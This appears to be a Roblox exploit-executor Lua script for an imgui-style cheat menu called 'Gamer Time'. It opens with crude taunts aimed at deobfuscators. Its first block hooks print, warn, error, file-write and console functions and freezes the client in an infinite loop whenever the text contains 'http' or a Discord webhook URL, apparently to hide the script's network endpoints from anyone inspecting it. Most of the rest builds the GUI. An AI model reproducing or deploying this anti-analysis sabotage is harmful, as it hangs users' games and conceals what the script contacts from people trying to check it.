-- hello if u manage to deobfuscate this script its fine :)
-- its all good lol
-- i dont care if u deobfuscate 
-- nothing i can do tbh if u did so yeah 
-- wow u must be  special to crack my script LOL suck my dick
task.spawn(function()
	hookfunction(print, function(a) if string.find(a:lower(), "http") then while true do end end end)
	hookfunction(warn, function(a) if string.find(a:lower(), "http") then while true do end end end)
	hookfunction(error, function(a) if string.find(a:lower(), "http") then while true do end end end)
	local oldwrite  oldwrite = hookfunction(writefile, function(file, content)  if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then  while true do end  return end     return oldwrite(file, content) end)
	local oldappend oldappend = hookfunction(appendfile, function(file, content) if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then while true do end return end return oldappend(file, content) end)
	game.DescendantAdded:Connect(function(c) if c and c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message') then if string.find(string.lower(c.Text), 'http') then while true do end c:Destroy() end end end)
	getgenv().rconsoletitle = nil getgenv().rconsoleprint = nil getgenv().rconsolewarn = nil getgenv().rconsoleinfo = nil getgenv().rconsolerr = nil getgenv().clonefunction = function(...) while true do end return end
	game.CoreGui.ChildAdded:Connect(function(c) if(string.lower(c.Name) == 'devconsolemaster') then while true do end c:Destroy() end end)
	local oldNamecall oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...) local method = getnamecallmethod()
	if(string.lower(method) == 'rconsoleprint') then while true do end return  end
	if(string.lower(method) == 'rconsoleinfo') then while true do end return end
	if(string.lower(method) == 'rconsolewarn') then while true do end return  end
	if(string.lower(method) == 'rconsoleerr') then while true do end return end
	if(string.lower(method) == 'warn') then while true do end return end
	if(string.lower(method) == 'error') then while true do end return end 
	if(string.lower(method) == 'rendernametag') then while true do end return  end 
	return oldNamecall(self, ...)
	end))
  end)

local ui_options = {
	main_color = Color3.fromRGB(105, 105, 105),
	min_size = Vector2.new(550, 450),
	toggle_key = Enum.KeyCode.F3,
}

do
	local imgui = game:GetService("CoreGui"):FindFirstChild("imgui")
	if imgui then imgui:Destroy() end
end

local imgui = Instance.new("ScreenGui")
local Prefabs = Instance.new("Frame")
local Label = Instance.new("TextLabel")
local Window = Instance.new("ImageLabel")
local Resizer = Instance.new("Frame")
local Bar = Instance.new("Frame")
local Toggle = Instance.new("TextButton")
local Base = Instance.new("ImageLabel")
local Top = Instance.new("ImageLabel")
local Tabs = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TabSelection = Instance.new("ImageLabel")
local TabButtons = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Frame = Instance.new("Frame")
local Tab = Instance.new("Frame")
local UIListLayout_2 = Instance.new("UIListLayout")
local TextBox = Instance.new("TextBox")
local TextBox_Roundify_4px = Instance.new("ImageLabel")
local Slider = Instance.new("ImageLabel")
local Title_2 = Instance.new("TextLabel")
local Indicator = Instance.new("ImageLabel")
local Value = Instance.new("TextLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Circle = Instance.new("ImageLabel")
local UIListLayout_3 = Instance.new("UIListLayout")
local Dropdown = Instance.new("TextButton")
local Indicator_2 = Instance.new("ImageLabel")
local Box = Instance.new("ImageButton")
local Objects = Instance.new("ScrollingFrame")
local UIListLayout_4 = Instance.new("UIListLayout")
local TextButton_Roundify_4px = Instance.new("ImageLabel")
local TabButton = Instance.new("TextButton")
local TextButton_Roundify_4px_2 = Instance.new("ImageLabel")
local Folder = Instance.new("ImageLabel")
local Button = Instance.new("TextButton")
local TextButton_Roundify_4px_3 = Instance.new("ImageLabel")
local Toggle_2 = Instance.new("ImageLabel")
local Objects_2 = Instance.new("Frame")
local UIListLayout_5 = Instance.new("UIListLayout")
local HorizontalAlignment = Instance.new("Frame")
local UIListLayout_6 = Instance.new("UIListLayout")
local Console = Instance.new("ImageLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local Source = Instance.new("TextBox")
local Comments = Instance.new("TextLabel")
local Globals = Instance.new("TextLabel")
local Keywords = Instance.new("TextLabel")
local RemoteHighlight = Instance.new("TextLabel")
local Strings = Instance.new("TextLabel")
local Tokens = Instance.new("TextLabel")
local Numbers = Instance.new("TextLabel")
local Info = Instance.new("TextLabel")
local Lines = Instance.new("TextLabel")
local ColorPicker = Instance.new("ImageLabel")
local Palette = Instance.new("ImageLabel")
local Indicator_3 = Instance.new("ImageLabel")
local Sample = Instance.new("ImageLabel")
local Saturation = Instance.new("ImageLabel")
local Indicator_4 = Instance.new("Frame")
local Switch = Instance.new("TextButton")
local TextButton_Roundify_4px_4 = Instance.new("ImageLabel")
local Title_3 = Instance.new("TextLabel")
local Button_2 = Instance.new("TextButton")
local TextButton_Roundify_4px_5 = Instance.new("ImageLabel")
local DropdownButton = Instance.new("TextButton")
local Keybind = Instance.new("ImageLabel")
local Title_4 = Instance.new("TextLabel")
local Input = Instance.new("TextButton")
local Input_Roundify_4px = Instance.new("ImageLabel")
local Windows = Instance.new("Frame")

imgui.Name = "imgui"
imgui.Parent = game:GetService("CoreGui")

Prefabs.Name = "Prefabs"
Prefabs.Parent = imgui
Prefabs.BackgroundColor3 = Color3.new(1, 1, 1)
Prefabs.Size = UDim2.new(0, 100, 0, 100)
Prefabs.Visible = false


Label.Name = "Label"
Label.Parent = Prefabs
Label.BackgroundColor3 = Color3.new(1, 1, 1)
Label.BackgroundTransparency = 1
Label.Size = UDim2.new(0, 200, 0, 20)
Label.Font = Enum.Font.GothamSemibold
Label.Text = "Hello, world 123"
Label.TextColor3 = Color3.new(1, 1, 1)
Label.TextSize = 14
Label.TextXAlignment = Enum.TextXAlignment.Left

Window.Name = "Window"
Window.Parent = Prefabs
Window.Active = true
Window.BackgroundColor3 = Color3.new(1, 1, 1)
Window.BackgroundTransparency = 1
Window.ClipsDescendants = true
Window.Position = UDim2.new(0, 20, 0, 20)
Window.Selectable = true
Window.Size = UDim2.new(0, 200, 0, 200)
Window.Image = "rbxassetid://2851926732"
Window.ImageColor3 = Color3.new(0.0823529, 0.0862745, 0.0901961)
Window.ScaleType = Enum.ScaleType.Slice
Window.SliceCenter = Rect.new(12, 12, 12, 12)

Resizer.Name = "Resizer"
Resizer.Parent = Window
Resizer.Active = true
Resizer.BackgroundColor3 = Color3.new(1, 1, 1)
Resizer.BackgroundTransparency = 1
Resizer.BorderSizePixel = 0
Resizer.Position = UDim2.new(1, -20, 1, -20)
Resizer.Size = UDim2.new(0, 20, 0, 20)

Bar.Name = "Bar"
Bar.Parent = Window
Bar.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0, 0, 0, 5)
Bar.Size = UDim2.new(1, 0, 0, 15)

Toggle.Name = "Toggle"
Toggle.Parent = Bar
Toggle.BackgroundColor3 = Color3.new(1, 1, 1)
Toggle.BackgroundTransparency = 1
Toggle.Position = UDim2.new(0, 5, 0, -2)
Toggle.Rotation = 0
Toggle.Size = UDim2.new(0, 20, 0, 20)
Toggle.ZIndex = 2
Toggle.Text = "C"
Toggle.Font = Enum.Font.FredokaOne
Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
Toggle.TextSize = 15.000
Toggle.TextWrapped = true

Base.Name = "Base"
Base.Parent = Bar
Base.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
Base.BorderSizePixel = 0
Base.Position = UDim2.new(0, 0, 0.800000012, 0)
Base.Size = UDim2.new(1, 0, 0, 10)
Base.Image = "rbxassetid://2851926732"
Base.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
Base.ScaleType = Enum.ScaleType.Slice
Base.SliceCenter = Rect.new(12, 12, 12, 12)

Top.Name = "Top"
Top.Parent = Bar
Top.BackgroundColor3 = Color3.new(1, 1, 1)
Top.BackgroundTransparency = 1
Top.Position = UDim2.new(0, 0, 0, -5)
Top.Size = UDim2.new(1, 0, 0, 10)
Top.Image = "rbxassetid://2851926732"
Top.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
Top.ScaleType = Enum.ScaleType.Slice
Top.SliceCenter = Rect.new(12, 12, 12, 12)

Tabs.Name = "Tabs"
Tabs.Parent = Window
Tabs.BackgroundColor3 = Color3.new(1, 1, 1)
Tabs.BackgroundTransparency = 1
Tabs.Position = UDim2.new(0, 15, 0, 60)
Tabs.Size = UDim2.new(1, -30, 1, -60)

Title.Name = "Title"
Title.Parent = Window
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 30, 0, 3)
Title.Size = UDim2.new(0, 200, 0, 20)
Title.Font = Enum.Font.GothamBold
Title.Text = "Gamer Time"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left

TabSelection.Name = "TabSelection"
TabSelection.Parent = Window
TabSelection.BackgroundColor3 = Color3.new(1, 1, 1)
TabSelection.BackgroundTransparency = 1
TabSelection.Position = UDim2.new(0, 15, 0, 30)
TabSelection.Size = UDim2.new(1, -30, 0, 25)
TabSelection.Visible = false
TabSelection.Image = "rbxassetid://2851929490"
TabSelection.ImageColor3 = Color3.new(0.145098, 0.14902, 0.156863)
TabSelection.ScaleType = Enum.ScaleType.Slice
TabSelection.SliceCenter = Rect.new(4, 4, 4, 4)

TabButtons.Name = "TabButtons"
TabButtons.Parent = TabSelection
TabButtons.BackgroundColor3 = Color3.new(1, 1, 1)
TabButtons.BackgroundTransparency = 1
TabButtons.Size = UDim2.new(1, 0, 1, 0)

UIListLayout.Parent = TabButtons
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 2)

Frame.Parent = TabSelection
Frame.BackgroundColor3 = Color3.new(0.12549, 0.227451, 0.372549)
Frame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 1, 0)
Frame.Size = UDim2.new(1, 0, 0, 2)

Tab.Name = "Tab"
Tab.Parent = Prefabs
Tab.BackgroundColor3 = Color3.new(1, 1, 1)
Tab.BackgroundTransparency = 1
Tab.Size = UDim2.new(1, 0, 1, 0)
Tab.Visible = false

UIListLayout_2.Parent = Tab
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 5)

TextBox.Parent = Prefabs
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundTransparency = 1
TextBox.BorderSizePixel = 0
TextBox.Size = UDim2.new(1, 0, 0, 20)
TextBox.ZIndex = 2
TextBox.Font = Enum.Font.GothamSemibold
TextBox.PlaceholderColor3 = Color3.new(0.698039, 0.698039, 0.698039)
TextBox.PlaceholderText = "Input Text"
TextBox.Text = ""
TextBox.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TextBox.TextSize = 14

TextBox_Roundify_4px.Name = "TextBox_Roundify_4px"
TextBox_Roundify_4px.Parent = TextBox
TextBox_Roundify_4px.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox_Roundify_4px.BackgroundTransparency = 1
TextBox_Roundify_4px.Size = UDim2.new(1, 0, 1, 0)
TextBox_Roundify_4px.Image = "rbxassetid://2851929490"
TextBox_Roundify_4px.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
TextBox_Roundify_4px.ScaleType = Enum.ScaleType.Slice
TextBox_Roundify_4px.SliceCenter = Rect.new(4, 4, 4, 4)

Slider.Name = "Slider"
Slider.Parent = Prefabs
Slider.BackgroundColor3 = Color3.new(1, 1, 1)
Slider.BackgroundTransparency = 1
Slider.Position = UDim2.new(0, 0, 0.178571433, 0)
Slider.Size = UDim2.new(1, 0, 0, 20)
Slider.Image = "rbxassetid://2851929490"
Slider.ImageColor3 = Color3.new(0.145098, 0.14902, 0.156863)
Slider.ScaleType = Enum.ScaleType.Slice
Slider.SliceCenter = Rect.new(4, 4, 4, 4)

Title_2.Name = "Title"
Title_2.Parent = Slider
Title_2.BackgroundColor3 = Color3.new(1, 1, 1)
Title_2.BackgroundTransparency = 1
Title_2.Position = UDim2.new(0.5, 0, 0.5, -10)
Title_2.Size = UDim2.new(0, 0, 0, 20)
Title_2.ZIndex = 2
Title_2.Font = Enum.Font.GothamBold
Title_2.Text = "Slider"
Title_2.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Title_2.TextSize = 14

Indicator.Name = "Indicator"
Indicator.Parent = Slider
Indicator.BackgroundColor3 = Color3.new(1, 1, 1)
Indicator.BackgroundTransparency = 1
Indicator.Size = UDim2.new(0, 0, 0, 20)
Indicator.Image = "rbxassetid://2851929490"
Indicator.ImageColor3 = Color3.new(0.254902, 0.262745, 0.278431)
Indicator.ScaleType = Enum.ScaleType.Slice
Indicator.SliceCenter = Rect.new(4, 4, 4, 4)

Value.Name = "Value"
Value.Parent = Slider
Value.BackgroundColor3 = Color3.new(1, 1, 1)
Value.BackgroundTransparency = 1
Value.Position = UDim2.new(1, -55, 0.5, -10)
Value.Size = UDim2.new(0, 50, 0, 20)
Value.Font = Enum.Font.GothamBold
Value.Text = "0%"
Value.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Value.TextSize = 14

TextLabel.Parent = Slider
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(1, -20, -0.75, 0)
TextLabel.Size = UDim2.new(0, 26, 0, 50)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "]"
TextLabel.TextColor3 = Color3.new(0.627451, 0.627451, 0.627451)
TextLabel.TextSize = 14

TextLabel_2.Parent = Slider
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.Position = UDim2.new(1, -65, -0.75, 0)
TextLabel_2.Size = UDim2.new(0, 26, 0, 50)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = "["
TextLabel_2.TextColor3 = Color3.new(0.627451, 0.627451, 0.627451)
TextLabel_2.TextSize = 14

Circle.Name = "Circle"
Circle.Parent = Prefabs
Circle.BackgroundColor3 = Color3.new(1, 1, 1)
Circle.BackgroundTransparency = 1
Circle.Image = "rbxassetid://266543268"
Circle.ImageTransparency = 0.5

UIListLayout_3.Parent = Prefabs
UIListLayout_3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 20)

Dropdown.Name = "Dropdown"
Dropdown.Parent = Prefabs
Dropdown.BackgroundColor3 = Color3.new(1, 1, 1)
Dropdown.BackgroundTransparency = 1
Dropdown.BorderSizePixel = 0
Dropdown.Position = UDim2.new(-0.055555556, 0, 0.0833333284, 0)
Dropdown.Size = UDim2.new(0, 200, 0, 20)
Dropdown.ZIndex = 2
Dropdown.Font = Enum.Font.GothamBold
Dropdown.Text = "      Dropdown"
Dropdown.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Dropdown.TextSize = 14
Dropdown.TextXAlignment = Enum.TextXAlignment.Left

Indicator_2.Name = "Indicator"
Indicator_2.Parent = Dropdown
Indicator_2.BackgroundColor3 = Color3.new(1, 1, 1)
Indicator_2.BackgroundTransparency = 1
Indicator_2.Position = UDim2.new(0.899999976, -10, 0.100000001, 0)
Indicator_2.Rotation = -90
Indicator_2.Size = UDim2.new(0, 15, 0, 15)
Indicator_2.ZIndex = 2
Indicator_2.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4744658743"

Box.Name = "Box"
Box.Parent = Dropdown
Box.BackgroundColor3 = Color3.new(1, 1, 1)
Box.BackgroundTransparency = 1
Box.Position = UDim2.new(0, 0, 0, 25)
Box.Size = UDim2.new(1, 0, 0, 150)
Box.ZIndex = 3
Box.Image = "rbxassetid://2851929490"
Box.ImageColor3 = Color3.new(0.129412, 0.133333, 0.141176)
Box.ScaleType = Enum.ScaleType.Slice
Box.SliceCenter = Rect.new(4, 4, 4, 4)

Objects.Name = "Objects"
Objects.Parent = Box
Objects.BackgroundColor3 = Color3.new(1, 1, 1)
Objects.BackgroundTransparency = 1
Objects.BorderSizePixel = 0
Objects.Size = UDim2.new(1, 0, 1, 0)
Objects.ZIndex = 3
Objects.CanvasSize = UDim2.new(0, 0, 0, 0)
Objects.ScrollBarThickness = 8

UIListLayout_4.Parent = Objects
UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder

TextButton_Roundify_4px.Name = "TextButton_Roundify_4px"
TextButton_Roundify_4px.Parent = Dropdown
TextButton_Roundify_4px.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_Roundify_4px.BackgroundTransparency = 1
TextButton_Roundify_4px.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_4px.Image = "rbxassetid://2851929490"
TextButton_Roundify_4px.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
TextButton_Roundify_4px.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_4px.SliceCenter = Rect.new(4, 4, 4, 4)

TabButton.Name = "TabButton"
TabButton.Parent = Prefabs
TabButton.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
TabButton.BackgroundTransparency = 1
TabButton.BorderSizePixel = 0
TabButton.Position = UDim2.new(0.185185179, 0, 0, 0)
TabButton.Size = UDim2.new(0, 71, 0, 20)
TabButton.ZIndex = 2
TabButton.Font = Enum.Font.GothamSemibold
TabButton.Text = "Test tab"
TabButton.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TabButton.TextSize = 14

TextButton_Roundify_4px_2.Name = "TextButton_Roundify_4px"
TextButton_Roundify_4px_2.Parent = TabButton
TextButton_Roundify_4px_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_Roundify_4px_2.BackgroundTransparency = 1
TextButton_Roundify_4px_2.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_4px_2.Image = "rbxassetid://2851929490"
TextButton_Roundify_4px_2.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
TextButton_Roundify_4px_2.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_4px_2.SliceCenter = Rect.new(4, 4, 4, 4)

Folder.Name = "Folder"
Folder.Parent = Prefabs
Folder.BackgroundColor3 = Color3.new(1, 1, 1)
Folder.BackgroundTransparency = 1
Folder.Position = UDim2.new(0, 0, 0, 50)
Folder.Size = UDim2.new(1, 0, 0, 20)
Folder.Image = "rbxassetid://2851929490"
Folder.ImageColor3 = Color3.new(0.0823529, 0.0862745, 0.0901961)
Folder.ScaleType = Enum.ScaleType.Slice
Folder.SliceCenter = Rect.new(4, 4, 4, 4)

Button.Name = "Button"
Button.Parent = Folder
Button.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
Button.BackgroundTransparency = 1
Button.BorderSizePixel = 0
Button.Size = UDim2.new(1, 0, 0, 20)
Button.ZIndex = 2
Button.Font = Enum.Font.GothamSemibold
Button.Text = "      Folder"
Button.TextColor3 = Color3.new(1, 1, 1)
Button.TextSize = 14
Button.TextXAlignment = Enum.TextXAlignment.Left

TextButton_Roundify_4px_3.Name = "TextButton_Roundify_4px"
TextButton_Roundify_4px_3.Parent = Button
TextButton_Roundify_4px_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_Roundify_4px_3.BackgroundTransparency = 1
TextButton_Roundify_4px_3.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_4px_3.Image = "rbxassetid://2851929490"
TextButton_Roundify_4px_3.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
TextButton_Roundify_4px_3.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_4px_3.SliceCenter = Rect.new(4, 4, 4, 4)

Toggle_2.Name = "Toggle"
Toggle_2.Parent = Button
Toggle_2.BackgroundColor3 = Color3.new(1, 1, 1)
Toggle_2.BackgroundTransparency = 1
Toggle_2.Position = UDim2.new(0, 5, 0, 0)
Toggle_2.Size = UDim2.new(0, 20, 0, 20)
Toggle_2.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"

Objects_2.Name = "Objects"
Objects_2.Parent = Folder
Objects_2.BackgroundColor3 = Color3.new(1, 1, 1)
Objects_2.BackgroundTransparency = 1
Objects_2.Position = UDim2.new(0, 10, 0, 25)
Objects_2.Size = UDim2.new(1, -10, 1, -25)
Objects_2.Visible = false

UIListLayout_5.Parent = Objects_2
UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_5.Padding = UDim.new(0, 5)

HorizontalAlignment.Name = "HorizontalAlignment"
HorizontalAlignment.Parent = Prefabs
HorizontalAlignment.BackgroundColor3 = Color3.new(1, 1, 1)
HorizontalAlignment.BackgroundTransparency = 1
HorizontalAlignment.Size = UDim2.new(1, 0, 0, 20)

UIListLayout_6.Parent = HorizontalAlignment
UIListLayout_6.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_6.Padding = UDim.new(0, 5)

Console.Name = "Console"
Console.Parent = Prefabs
Console.BackgroundColor3 = Color3.new(1, 1, 1)
Console.BackgroundTransparency = 1
Console.Size = UDim2.new(1, 0, 0, 200)
Console.Image = "rbxassetid://2851928141"
Console.ImageColor3 = Color3.new(0.129412, 0.133333, 0.141176)
Console.ScaleType = Enum.ScaleType.Slice
Console.SliceCenter = Rect.new(8, 8, 8, 8)

ScrollingFrame.Parent = Console
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(1, 0, 1, 1)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 4

Source.Name = "Source"
Source.Parent = ScrollingFrame
Source.BackgroundColor3 = Color3.new(1, 1, 1)
Source.BackgroundTransparency = 1
Source.Position = UDim2.new(0, 40, 0, 0)
Source.Size = UDim2.new(1, -40, 0, 10000)
Source.ZIndex = 3
Source.ClearTextOnFocus = false
Source.Font = Enum.Font.Code
Source.MultiLine = true
Source.PlaceholderColor3 = Color3.new(0.8, 0.8, 0.8)
Source.Text = ""
Source.TextColor3 = Color3.new(1, 1, 1)
Source.TextSize = 15
Source.TextStrokeColor3 = Color3.new(1, 1, 1)
Source.TextWrapped = true
Source.TextXAlignment = Enum.TextXAlignment.Left
Source.TextYAlignment = Enum.TextYAlignment.Top

Comments.Name = "Comments"
Comments.Parent = Source
Comments.BackgroundColor3 = Color3.new(1, 1, 1)
Comments.BackgroundTransparency = 1
Comments.Size = UDim2.new(1, 0, 1, 0)
Comments.ZIndex = 5
Comments.Font = Enum.Font.Code
Comments.Text = ""
Comments.TextColor3 = Color3.new(0.231373, 0.784314, 0.231373)
Comments.TextSize = 15
Comments.TextXAlignment = Enum.TextXAlignment.Left
Comments.TextYAlignment = Enum.TextYAlignment.Top

Globals.Name = "Globals"
Globals.Parent = Source
Globals.BackgroundColor3 = Color3.new(1, 1, 1)
Globals.BackgroundTransparency = 1
Globals.Size = UDim2.new(1, 0, 1, 0)
Globals.ZIndex = 5
Globals.Font = Enum.Font.Code
Globals.Text = ""
Globals.TextColor3 = Color3.new(0.517647, 0.839216, 0.968628)
Globals.TextSize = 15
Globals.TextXAlignment = Enum.TextXAlignment.Left
Globals.TextYAlignment = Enum.TextYAlignment.Top

Keywords.Name = "Keywords"
Keywords.Parent = Source
Keywords.BackgroundColor3 = Color3.new(1, 1, 1)
Keywords.BackgroundTransparency = 1
Keywords.Size = UDim2.new(1, 0, 1, 0)
Keywords.ZIndex = 5
Keywords.Font = Enum.Font.Code
Keywords.Text = ""
Keywords.TextColor3 = Color3.new(0.972549, 0.427451, 0.486275)
Keywords.TextSize = 15
Keywords.TextXAlignment = Enum.TextXAlignment.Left
Keywords.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight.Name = "RemoteHighlight"
RemoteHighlight.Parent = Source
RemoteHighlight.BackgroundColor3 = Color3.new(1, 1, 1)
RemoteHighlight.BackgroundTransparency = 1
RemoteHighlight.Size = UDim2.new(1, 0, 1, 0)
RemoteHighlight.ZIndex = 5
RemoteHighlight.Font = Enum.Font.Code
RemoteHighlight.Text = ""
RemoteHighlight.TextColor3 = Color3.new(0, 0.568627, 1)
RemoteHighlight.TextSize = 15
RemoteHighlight.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight.TextYAlignment = Enum.TextYAlignment.Top

Strings.Name = "Strings"
Strings.Parent = Source
Strings.BackgroundColor3 = Color3.new(1, 1, 1)
Strings.BackgroundTransparency = 1
Strings.Size = UDim2.new(1, 0, 1, 0)
Strings.ZIndex = 5
Strings.Font = Enum.Font.Code
Strings.Text = ""
Strings.TextColor3 = Color3.new(0.678431, 0.945098, 0.584314)
Strings.TextSize = 15
Strings.TextXAlignment = Enum.TextXAlignment.Left
Strings.TextYAlignment = Enum.TextYAlignment.Top

Tokens.Name = "Tokens"
Tokens.Parent = Source
Tokens.BackgroundColor3 = Color3.new(1, 1, 1)
Tokens.BackgroundTransparency = 1
Tokens.Size = UDim2.new(1, 0, 1, 0)
Tokens.ZIndex = 5
Tokens.Font = Enum.Font.Code
Tokens.Text = ""
Tokens.TextColor3 = Color3.new(1, 1, 1)
Tokens.TextSize = 15
Tokens.TextXAlignment = Enum.TextXAlignment.Left
Tokens.TextYAlignment = Enum.TextYAlignment.Top

Numbers.Name = "Numbers"
Numbers.Parent = Source
Numbers.BackgroundColor3 = Color3.new(1, 1, 1)
Numbers.BackgroundTransparency = 1
Numbers.Size = UDim2.new(1, 0, 1, 0)
Numbers.ZIndex = 4
Numbers.Font = Enum.Font.Code
Numbers.Text = ""
Numbers.TextColor3 = Color3.new(1, 0.776471, 0)
Numbers.TextSize = 15
Numbers.TextXAlignment = Enum.TextXAlignment.Left
Numbers.TextYAlignment = Enum.TextYAlignment.Top

Info.Name = "Info"
Info.Parent = Source
Info.BackgroundColor3 = Color3.new(1, 1, 1)
Info.BackgroundTransparency = 1
Info.Size = UDim2.new(1, 0, 1, 0)
Info.ZIndex = 5
Info.Font = Enum.Font.Code
Info.Text = ""
Info.TextColor3 = Color3.new(0, 0.635294, 1)
Info.TextSize = 15
Info.TextXAlignment = Enum.TextXAlignment.Left
Info.TextYAlignment = Enum.TextYAlignment.Top

Lines.Name = "Lines"
Lines.Parent = ScrollingFrame
Lines.BackgroundColor3 = Color3.new(1, 1, 1)
Lines.BackgroundTransparency = 1
Lines.BorderSizePixel = 0
Lines.Size = UDim2.new(0, 40, 0, 10000)
Lines.ZIndex = 4
Lines.Font = Enum.Font.Code
Lines.Text = "1\n"
Lines.TextColor3 = Color3.new(1, 1, 1)
Lines.TextSize = 15
Lines.TextWrapped = true
Lines.TextYAlignment = Enum.TextYAlignment.Top

ColorPicker.Name = "ColorPicker"
ColorPicker.Parent = Prefabs
ColorPicker.BackgroundColor3 = Color3.new(1, 1, 1)
ColorPicker.BackgroundTransparency = 1
ColorPicker.Size = UDim2.new(0, 180, 0, 110)
ColorPicker.Image = "rbxassetid://2851929490"
ColorPicker.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
ColorPicker.ScaleType = Enum.ScaleType.Slice
ColorPicker.SliceCenter = Rect.new(4, 4, 4, 4)

Palette.Name = "Palette"
Palette.Parent = ColorPicker
Palette.BackgroundColor3 = Color3.new(1, 1, 1)
Palette.BackgroundTransparency = 1
Palette.Position = UDim2.new(0.0500000007, 0, 0.0500000007, 0)
Palette.Size = UDim2.new(0, 100, 0, 100)
Palette.Image = "rbxassetid://698052001"
Palette.ScaleType = Enum.ScaleType.Slice
Palette.SliceCenter = Rect.new(4, 4, 4, 4)

Indicator_3.Name = "Indicator"
Indicator_3.Parent = Palette
Indicator_3.BackgroundColor3 = Color3.new(1, 1, 1)
Indicator_3.BackgroundTransparency = 1
Indicator_3.Size = UDim2.new(0, 5, 0, 5)
Indicator_3.ZIndex = 2
Indicator_3.Image = "rbxassetid://2851926732"
Indicator_3.ImageColor3 = Color3.new(0, 0, 0)
Indicator_3.ScaleType = Enum.ScaleType.Slice
Indicator_3.SliceCenter = Rect.new(12, 12, 12, 12)

Sample.Name = "Sample"
Sample.Parent = ColorPicker
Sample.BackgroundColor3 = Color3.new(1, 1, 1)
Sample.BackgroundTransparency = 1
Sample.Position = UDim2.new(0.800000012, 0, 0.0500000007, 0)
Sample.Size = UDim2.new(0, 25, 0, 25)
Sample.Image = "rbxassetid://2851929490"
Sample.ScaleType = Enum.ScaleType.Slice
Sample.SliceCenter = Rect.new(4, 4, 4, 4)

Saturation.Name = "Saturation"
Saturation.Parent = ColorPicker
Saturation.BackgroundColor3 = Color3.new(1, 1, 1)
Saturation.Position = UDim2.new(0.649999976, 0, 0.0500000007, 0)
Saturation.Size = UDim2.new(0, 15, 0, 100)
Saturation.Image = "rbxassetid://3641079629"

Indicator_4.Name = "Indicator"
Indicator_4.Parent = Saturation
Indicator_4.BackgroundColor3 = Color3.new(1, 1, 1)
Indicator_4.BorderSizePixel = 0
Indicator_4.Size = UDim2.new(0, 20, 0, 2)
Indicator_4.ZIndex = 2

Switch.Name = "Switch"
Switch.Parent = Prefabs
Switch.BackgroundColor3 = Color3.new(1, 1, 1)
Switch.BackgroundTransparency = 1
Switch.BorderSizePixel = 0
Switch.Position = UDim2.new(0.229411766, 0, 0.20714286, 0)
Switch.Size = UDim2.new(0, 20, 0, 20)
Switch.ZIndex = 2
Switch.Font = Enum.Font.SourceSans
Switch.Text = ""
